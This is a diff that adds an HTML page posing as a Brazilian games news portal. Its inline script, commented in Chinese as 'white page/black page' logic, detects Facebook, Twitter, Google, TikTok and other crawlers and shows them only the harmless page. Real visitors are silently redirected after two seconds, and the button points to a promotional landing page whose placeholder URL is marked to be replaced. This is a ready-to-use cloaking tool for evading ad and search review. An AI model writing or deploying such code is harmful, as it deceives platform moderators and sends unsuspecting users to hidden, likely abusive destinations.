@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Notícias de Jogos</title>
+  <meta name="description" content="Últimas notícias de esportes e jogos no Brasil.">
+  <style>
+    body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
+    h1 { color: #2a6; }
+    p { max-width: 600px; }
+    .btn {
+      display: inline-block;
+      padding: 12px 20px;
+      margin-top: 20px;
+      background: #2a6;
+      color: #fff;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h1>Notícias de Jogos no Brasil</h1>
+  <p>Bem-vindo ao nosso portal de notícias sobre jogos e esportes. Aqui você encontra atualizações diárias, análises e novidades do mundo gamer.</p>
+  <p>Role para baixo e veja mais 👇</p>
+
+  <a href="#" class="btn" id="goLink">Leia Mais</a>
+
+  <script>
+    // --- 白页/黑页分流逻辑 ---
+    const userAgent = navigator.userAgent.toLowerCase();
+    const isBot = /(facebookexternalhit|twitterbot|googlebot|tiktok|crawler|spider)/.test(userAgent);
+
+    if (!isBot) {
+      // 如果不是机器人（=真实用户），2秒后跳转到黑页
+      setTimeout(() => {
+        window.location.href = "https://seu-link-de-promocao.com"; // 🔗 改成你的落地页
+      }, 2000);
+
+      // 用户点击按钮时立即跳转
+      document.getElementById("goLink").href = "https://seu-link-de-promocao.com"; 
+    }
+  </script>
+</body>
+</html>
